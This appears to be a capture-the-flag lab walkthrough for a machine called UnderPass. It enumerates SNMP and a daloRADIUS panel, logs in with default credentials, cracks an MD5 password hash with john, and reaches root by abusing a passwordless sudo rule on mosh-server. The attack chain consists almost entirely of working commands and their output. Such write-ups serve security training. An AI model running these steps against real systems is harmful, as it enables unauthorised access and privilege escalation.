# CTF Walkthrough: UnderPass

## Table of Contents
- [1. Introduction](#1-introduction)
- [2. Information Gathering](#2-information-gathering)
- [3. Foothold](#3-foothold)
- [5. Privilege Escalation](#5-privilege-escalation)

---

## 1. Introduction
 
**Category:** UDP, SNMP, daloradius 
**Difficulty Level:** Easy   
**CVE(s) involved:** 

---

## 2. Information Gathering

### 2.1. Initial Enumeration
- **Add to /etc/hosts**
    - Command: `echo "10.10.11.48 underpass.htb" | sudo tee -a /etc/hosts`

- **Running Services**
    - Command: `nmap -sV -sC underpass.htb`
        - Output:
            ```
            PORT   STATE SERVICE VERSION
            22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
            | ssh-hostkey:
            |   256 48:b0:d2:c7:29:26:ae:3d:fb:b7:6b:0f:f5:4d:2a:ea (ECDSA)
            |_  256 cb:61:64:b8:1b:1b:b5:ba:b8:45:86:c5:16:bb:e2:a2 (ED25519)
            80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
            |_http-title: Apache2 Ubuntu Default Page: It works
            |_http-server-header: Apache/2.4.52 (Ubuntu)
            Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

            Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
            Nmap done: 1 IP address (1 host up) scanned in 14.33 seconds
            ```
- **Running Services (UDP)**
    - Command: `nmap -sV -sC -sU --top-ports=100 underpass.htb`
        - Output:
            ```
            PORT     STATE         SERVICE VERSION
            161/udp  open          snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
            | snmp-info:
            |   enterprise: net-snmp
            |   engineIDFormat: unknown
            |   engineIDData: c7ad5c4856d1cf6600000000
            |   snmpEngineBoots: 31
            |_  snmpEngineTime: 3h05m27s
            | snmp-sysdescr: Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64
            |_  System uptime: 3h05m27.21s (1112721 timeticks)
            1812/udp open|filtered radius
            1813/udp open|filtered radacct
            Service Info: Host: UnDerPass.htb is the only daloradius server in the basin!
            ```

- **SNMP**
    - Command: `snmp-check 10.10.11.48`
        - Output:
            ```
            snmp-check v1.9 - SNMP enumerator
            Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)

            [+] Try to connect to 10.10.11.48:161 using SNMPv1 and community 'public'

            [*] System information:

              Host IP address               : 10.10.11.48
              Hostname                      : UnDerPass.htb is the only daloradius server in the basin!
              Description                   : Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64
              Contact                       : steve@underpass.htb
              Location                      : Nevada, U.S.A. but not Vegas
              Uptime snmp                   : 03:13:55.32
              Uptime system                 : 03:13:44.90
              System date                   : 2025-5-19 07:37:30.0
            ```
    
    OR

    - Command: `snmpwalk -v 1 -c public underpass.htb`
        - Output:
            ```
            iso.3.6.1.2.1.1.1.0 = STRING: "Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64"
            iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
            iso.3.6.1.2.1.1.3.0 = Timeticks: (1173841) 3:15:38.41
            iso.3.6.1.2.1.1.4.0 = STRING: "steve@underpass.htb"
            iso.3.6.1.2.1.1.5.0 = STRING: "UnDerPass.htb is the only daloradius server in the basin!"
            iso.3.6.1.2.1.1.6.0 = STRING: "Nevada, U.S.A. but not Vegas"
            iso.3.6.1.2.1.1.7.0 = INTEGER: 72
            iso.3.6.1.2.1.1.8.0 = Timeticks: (1) 0:00:00.01
            iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1
            ```

- **Directory Busting**
    - A quick Google search tells that daloradius operator login page can be found at `/daloradius/app/operators/FUZZ`

    - Commnad: `ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://underpass.htb/daloradius/app/operators/FUZZ -e .php -recursion`
        - Output:
            ```
            login.php               [Status: 200, Size: 2763, Words: 349, Lines: 98, Duration: 110ms]
            logout.php              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 106ms]
            ```

## 3. Foothold
- Another quick Google search tells that default password for `administrator` is `radius`

    - Go to Management > Users > List users
        - Output:
            ```
            Username: svcMosh
	        Password: 412DD4759978ACFCC81DEAB01B382403
            ```
        - Crack the hash
            - Save the hash to `hash` file
                - Command: `echo 412DD4759978ACFCC81DEAB01B382403 > hash`

            - Crack the hash
                - Command: `john --format=Raw-MD5 -w=/usr/share/wordlists/rockyou.txt hash`
                    - Output:
                        ```
                        underwaterfriends (?)
                        ```

- **SSH Login**
    - Command: `ssh svcMosh@underpass.htb`
        - Password: underwaterfriends

- **User Flag**:
    - Command: `cat user.txt`
        - Output:
            ```
            1fda5e957f5e86f12b54c84030cc6e84
            ```

## 4. Privilege Escalation
- Check elevating Privileges
    - Command: `sudo -l`
        - Output:
            ```
            Matching Defaults entries for svcMosh on localhost:
                env_reset, mail_badpass,
                secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
                use_pty

            User svcMosh may run the following commands on localhost:
                (ALL) NOPASSWD: /usr/bin/mosh-server
            ```

- Exploit privilege
    - Command: `sudo mosh-server`
        - Output:
            ```
            MOSH CONNECT 60002 I27II6UVclhziVBmcJDXZQ

            mosh-server (mosh 1.3.2) [build mosh 1.3.2]
            Copyright 2012 Keith Winstein <mosh-devel@mit.edu>
            License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>.
            This is free software: you are free to change and redistribute it.
            There is NO WARRANTY, to the extent permitted by law.

            [mosh-server detached, pid = 3379]

            ```
    - Checking Documentation[https://mosh.org/#usage], we can connect to remote server using `MOSH_KEY=key mosh-client remote-IP remote-PORT`
    - Command: `sudo apt install mosh`
    - Command: `MOSH_KEY=I27II6UVclhziVBmcJDXZQ mosh-client 10.10.11.48 60002`
        - Output:
            ```
            root@underpass:~#
            ```

- **Root Flag**:
    - Command: `cat root.txt`
        - Output:
            ```
            d1a3de914b327f55b5258969eb741f12
            ```









